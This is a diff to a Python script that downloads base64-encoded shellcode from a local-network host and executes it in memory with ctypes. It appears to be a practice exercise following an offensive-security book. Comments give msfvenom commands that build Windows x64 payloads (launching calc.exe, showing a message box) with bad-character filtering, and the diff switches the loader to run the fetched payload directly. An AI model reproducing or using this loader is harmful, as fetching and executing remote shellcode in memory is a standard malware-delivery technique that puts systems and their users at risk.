@@ -2,17 +2,19 @@ from urllib import request
 
 import base64
 import ctypes
-import threading
-
-
-URL = 'http://192.168.1.145/calc.bin'
-# URL = 'http://192.168.1.145/msg.bin'
-
 
 #? Proper syntax for shellcode creation in msfvenom for a 64 bit system is:
 
-#! msfvenom -p windows/x64/exec -f raw cmd=calc.exe -o shellcode.raw
-#! base64 -w 0 -i shellcode.raw > shellcode.bin
+#! WORKS WITH CRASH
+
+#! msfvenom -p windows/x64/messagebox TEXT="Test Msg" TITLE="Test Title" -b '\x00' '\x0A' '\x0D' '\xFF' '\x20' EXITFUNC=thread -o msg.raw
+#! base64 -w 0 -i msg.raw > msg.bin
+
+#! msfvenom -p windows/x64/exec -f raw cmd=calc.exe -b '\x00' '\x0A' '\x0D' '\xFF' '\x20' EXITFUNC=thread -o calc.raw
+#! base64 -w 0 -i calc.raw > calc.bin
+
+URL = 'http://192.168.1.145/calc.bin'
+# URL = 'http://192.168.1.145/msg.bin'
 
 #? Not the incorrect example in the f-ing book....
 
@@ -113,12 +115,12 @@ def run(shellcode):
 if __name__ == '__main__':
     url = URL
     shellcode = get_code(URL)
-    # print(shellcode)
+    print(shellcode)
 
     try:
-        # run(shellcode)
-        exe_shell = threading.Thread(target=run, args=(shellcode,))
-        exe_shell.run()
+        run(shellcode)
+        # exe_shell = threading.Thread(target=run, args=(shellcode,))
+        # exe_shell.run()
     except Exception as e:
         print(f'Will Python crash?  {e}')
     #? the run function will call write_memory 
